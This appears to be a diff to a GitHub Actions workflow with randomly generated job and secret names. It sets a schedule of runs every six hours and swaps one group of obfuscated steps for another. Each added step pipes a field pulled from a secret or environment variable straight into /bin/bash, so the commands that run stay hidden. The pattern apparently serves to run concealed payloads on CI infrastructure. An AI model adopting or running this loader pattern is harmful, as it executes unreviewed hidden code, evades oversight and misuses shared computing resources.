@@ -2,23 +2,18 @@ name: jiangneihe3765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
-jobs:  # 899
+    - cron: '10 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jiangneihe3765
         env:
-          opui98: ${{ secrets.opui98 }}
+          hb68409: ${{ secrets.hb68409 }}
         run: |
-          echo $opui98 | jq -r .vwuk20 | /bin/bash
-          echo $dxa5204 | jq -r .mlzt872 | /bin/bash
-          echo $k036 | jq -r .pdizx60463 | /bin/bash
-          echo $sed6 | jq -r .teec4872 | /bin/bash
-          echo $yox529 | jq -r .kdv030 | /bin/bash
-          echo $rxo3716 | jq -r .cyv392 | /bin/bash
-          echo $ogt4890 | jq -r .ud8278 | /bin/bash
-          echo $xev0293 | jq -r .hsq94999 | /bin/bash
-          echo $oxrvm4871 | jq -r .ndho2329 | /bin/bash
+          echo $hb68409 | jq -r .c970 | /bin/bash
+          echo $nbk30 | jq -r .ts1 | /bin/bash
+          echo $bd91 | jq -r .rronk59961 | /bin/bash
+          echo $aor9 | jq -r .f55 | /bin/bash
 
